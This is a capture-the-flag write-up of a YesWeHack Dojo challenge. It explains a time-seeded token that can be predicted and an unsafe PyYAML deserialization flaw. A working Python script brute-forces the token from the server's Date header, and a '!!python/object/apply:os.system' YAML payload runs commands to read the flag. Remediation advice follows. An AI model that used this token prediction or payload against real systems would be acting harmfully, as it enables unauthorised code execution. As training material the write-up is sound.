---
title: CCTV Manager - Dojo [Yeswehack]
date: 2025-08-11 4:00:00 +0200
categories: [Dojo]
tags: [ Insecure-Deserlization , Yaml, RCE , TimeToken]
toc: true
comments: true
image: ./assets/img/attachments/cctv.png
---
You can find the challenge [here](https://dojo-yeswehack.com/challenge-of-the-month/dojo-43).
## 1- Challenge Data 
#### Description
During a pentest, we discovered a rare custom Linux distro running a CCTV management program that seems to be stuck in a boot process. If we can upload a custom firmware, we should be able to get a remote code execution (RCE) on the CCTV. We leave the rest to you.
#### Goal
To get the flag using remote code execution

## 2- Vulnerability Description
Insecure deserialization is a type of security vulnerability that occurs when an application accepts serialized data from an untrusted source and deserializes it without proper validation. Deserialization is the process of reconstructing objects or data structures from a serialized format such as JSON, XML, or binary data. If the serialized data can be modified by an attacker, they may craft malicious payloads that alter application behavior, manipulate internal objects, or trigger the execution of arbitrary code. This type of vulnerability often arises when applications rely on insecure serialization formats, trust user-supplied data without verification, or automatically execute code during the deserialization process.

## 3- Impact 
An attacker can exploit insecure deserialization to manipulate application logic, escalate privileges, bypass authentication, or execute arbitrary code on the server. In severe cases, this can lead to complete compromise of the application and its underlying host, allowing the attacker to steal sensitive information, modify data, or gain persistent control over the system.

## 4- Code Analysis
The provided Python code implements a simple web template rendering process with conditional firmware updates based on token verification.
**Key observations relevant to exploitation:**
#### Predictable Token Generation
In `main()`, the seed is derived from the current Unix timestamp truncated to seconds:
```python
tokenRoot = genToken(int(time.time()) // 1)
```

```python
def genToken(seed:str) -> str:

    random.seed(seed)

    return ''.join(random.choices('abcdef0123456789', k=16))
```

Because the seed is predictable (based on server time), we can replicate the token generation and obtain a valid `tokenRoot`
#### Token Comparison for Access Control
Access is granted if the guest token matches the root token:
```python
access = bool(tokenGuest == tokenRoot)
```
The trick here is that `tokenRoot` is generated using the current Unix timestamp as the seed. By synchronizing our local time with the server’s time, we can reproduce the exact same token value and bypass this check.
#### Unsafe YAML Deserialization
When `access` is `True`, the code executes:
```python
data = yaml.load(yamlConfig, Loader=yaml.Loader) 
firmware = Firmware(**data["firmware"]) 
firmware.update()
```
The `yaml.load()` function is invoked with `yaml.Loader` instead of `SafeLoader`, which allows the deserialization of arbitrary Python objects. This means we can supply a malicious YAML payload to execute arbitrary code on the server.

Since `yamlConfig` is populated directly from untrusted input via `unquote()`, with no validation or sanitization before deserialization, we have a direct insecure deserialization vector.
## 5- Exploitation
By supplying arbitrary values to both the `token` and `yaml` parameters, we receive the following HTML response:

![w](/assets/img/attachments/Pasted image 20250812154505.png)

The first step is to synchronize our local time with the server’s time, as the token generation relies on the current Unix timestamp.

![w](/assets/img/attachments/Pasted image 20250812154951.png)

Will use date header at our python script to bypass token validation

```python
import requests  
import time  
import random  
from email.utils import parsedate_to_datetime  
from concurrent.futures import ThreadPoolExecutor, as_completed   
import urllib3  
   
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  
URL = "https://dojo-yeswehack.com/api/challenges/285cec14-a511-4567-93f5-e709b0eaf9b9"  
  
HEADERS = {  
    "User-Agent": "Mozilla/5.0",  
    "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",  
    "Origin": "https://dojo-yeswehack.com",  
    "Referer": "https://dojo-yeswehack.com/challenge-of-the-month/dojo-43",  
    "Cookie": "add your cookies"  
}  
  
def genToken(seed: int) -> str:  
    random.seed(seed)  
    return ''.join(random.choices('abcdef0123456789', k=16))  
  
def get_server_time():  
    r = requests.head(URL, headers=HEADERS)  
    server_date = r.headers.get("Date")  
    if not server_date:  
        raise Exception("No Date header found")  
    dt = parsedate_to_datetime(server_date)  
    return int(dt.timestamp())  
  
def try_seed(seed):  
    token = genToken(seed)  
  
    data = {  
        "yaml": "",  
        "token": token  
    }  
  
    r = requests.post(URL, headers=HEADERS, data=data)  
    print(f"[HTTP {r.status_code}] seed={seed} token={token} len={len(r.text)}")  
    if "unauthorized" not in r.text.lower() and r.status_code != 429:  
        return seed, token, r.text  
    return None  
  
def main():  
    server_time = get_server_time()  
    print(f"[+] Server time: {server_time}")  
    seeds = [server_time - 1, server_time, server_time + 1]  
  
    with ThreadPoolExecutor(max_workers=3) as executor:  
        futures = [executor.submit(try_seed, s) for s in seeds]  
        for future in as_completed(futures):  
            result = future.result()  
            if result:  
                seed, token, resp = result  
                print(f"[+] Success! seed={seed}, token={token}")  
                print(resp)  
                break  
  
if __name__ == "__main__":  
    main()
```

The exploitation logic is structured into three main steps:

- **First** – Retrieve the server’s current time from the `Date` header in the HTTP response and convert it into a Unix timestamp. This timestamp is then used as the seed to generate a predicted token matching the server’s logic.
    
- **Second** – Brute-force a small time offset window by testing the exact server time, as well as one second before and after. A valid token is identified when the response does not contain “unauthorized” and is not a rate-limit error (`HTTP 429`).
    
- **Last** – Perform parallel execution using `ThreadPoolExecutor` to test all three time candidates simultaneously. The process stops as soon as a valid token is found, printing the seed, token, and full server response.

This process may need to be repeated two to three times before a valid token is found. Once we confirm that the script successfully generates a valid token, we proceed to the next step of the exploitation chain.

Since `yamlConfig` is vulnerable to insecure deserialization, we use the following payload:
```json
"yaml": "!!python/object/apply:os.system ['id']"
```

We use `!!python/object/apply:os.system` because it instructs the YAML loader to execute the `os.system` function with the provided argument, in this case `id`, allowing us to execute arbitrary system commands on the server.

Finally,  the `Settings` code indicates that the flag is stored in an environment variable.

![w](/assets/img/attachments/Pasted image 20250812160530.png)
## 6- Proof of Concept
**Bypassing Token Validation** – Successfully matching the server’s token to gain access.

![w](/assets/img/attachments/Pasted image 20250812161459.png)

**Exploiting Insecure YAML Deserialization** – Executing system commands through a crafted YAML payload.

![w](/assets/img/attachments/Pasted image 20250812161709.png)
**Retrieving the Flag** – Reading the environment variable containing the flag via command execution.

![w](/assets/img/attachments/Pasted image 20250812161947.png)

```
FLAG{M4lware_F1rmw4r3_N0t_F0und}
```

## 7- Remediation

- **Secure Token Generation** – Use a cryptographically secure, unpredictable token generation method that does not rely solely on server time.
    
- **Safe YAML Parsing** – Replace `yaml.load()` with `yaml.safe_load()` to prevent arbitrary object deserialization.
    
- **Restrict Command Execution** – Avoid passing user-supplied data to functions capable of executing system commands.
    
- **Environment Variable Protection** – Ensure sensitive values, such as flags, are not directly accessible from untrusted code execution contexts.
